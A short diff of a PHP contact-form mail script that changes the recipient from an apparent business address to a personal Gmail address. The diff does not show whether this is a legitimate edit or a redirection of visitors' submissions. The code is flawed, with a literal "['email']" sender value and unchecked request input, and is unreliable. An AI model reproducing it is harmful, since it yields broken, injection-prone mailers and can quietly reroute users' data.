@@ -1,7 +1,7 @@
 <?php
 session_cache_limiter( 'nocache' );
 $subject = $_REQUEST['You have received a mail']; // Subject of your email
-$to = "care@choplessglobalplaza.com.ng";  //Recipient's E-mail
+$to = "osborneosas12@gmail.com";  //Recipient's E-mail
 $from = "['email']"; //Recipient's E-mail
 
 $headers  = 'MIME-Version: 1.0' . "\r\n";
